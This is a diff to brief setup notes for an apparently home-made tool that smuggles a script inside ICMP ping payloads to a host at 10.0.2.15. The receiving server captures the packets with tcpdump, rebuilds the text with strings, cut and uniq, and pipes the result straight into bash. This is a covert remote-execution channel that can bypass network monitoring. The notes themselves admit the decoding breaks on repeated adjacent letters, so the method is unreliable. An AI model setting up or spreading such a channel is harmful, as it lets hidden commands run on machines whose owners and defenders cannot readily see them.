@@ -1,12 +1,12 @@
 Server:
-  sudo tcpdump icmp -i any -A -w captures
+  sudo tcpdump icmp -i any -A -w captures&
 Client:
-  Compile encode.c
   gcc encode.c
   ./a.out script| awk '{printf("ping -c1 -p %s 10.0.2.15\n",$1)}'| bash
 Server:
-  Control-C (want to get rid of in the furure because it destroys most utility)
-  parse captures file *work in progress
-    you can cat captures to view the message in the pcap binary
-    "tcpdump -A -r captures" is the proper way to do it but I do not know how to parse it
-  pipe the parsed (and concatanated) string into a shell (like bash)
+  strings captures| cut -c 1|uniq|tr -d '\n'|bash
+
+
+
+Bug:
+  It might bug out if there are duplicate (adjacent) letters in the script since that is the trick I use to parse it
